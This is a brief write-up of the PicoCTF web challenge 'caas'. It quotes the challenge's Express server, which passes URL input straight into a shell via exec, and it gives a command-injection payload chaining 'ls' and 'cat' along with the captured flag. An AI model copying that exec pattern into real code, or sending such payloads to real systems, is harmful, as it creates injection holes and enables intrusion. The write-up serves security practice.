---
title: PicoCTF - caas
tags: [PicoCTF, CTF, Web]

category: "Security｜Practice｜PicoCTF｜Web"
date: 2023-06-20
---

# PicoCTF - caas
<!-- more -->
###### tags: `PicoCTF` `CTF` `Web`

## Background
[Command Injection](https://lab.feifei.tw/practice/ci/l1.php)

## Source code
```javascript=
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});

```

## Recon
直覺是command injection

## Exploit - Easy Command Injection
Payload: `/cowsay/123;ls;cat falg.txt`
Flag: `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`

## Reference
[ CaaS | Web Category | PicoCTF | CTF For beginners ](https://youtu.be/ZP3kLVaMQIE)